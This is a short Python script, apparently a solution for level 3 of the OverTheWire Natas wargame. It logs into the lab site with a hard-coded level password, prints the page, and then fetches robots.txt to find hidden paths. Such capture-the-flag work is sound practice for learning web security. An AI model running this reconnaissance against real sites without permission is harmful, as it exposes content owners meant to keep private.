# exploit.

import requests
from requests.auth import HTTPBasicAuth

url = 'http://natas3.natas.labs.overthewire.org/'
auth_data = HTTPBasicAuth('natas3', 'sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14')
r = requests.post(url, auth = auth_data)

print("[*] Status Code: " + str(r.status_code))
print("[*] Page Source: " + "\n" + str(r.text))

# We get: 'Not even google will find it this time... '. Let's ask google :)
# 
# 'Site owners have many choices about how Google crawls and indexes 
# their sites through Webmaster Tools and a file called “robots.txt”. With the robots.txt file, 
# site owners can choose not to be crawled by Googlebot, or they can provide more specific instructions 
# about how to process pages on their sites.'
#
#
print('--------------------')
r = requests.post(url + "robots.txt", auth = auth_data)
print(r.text)

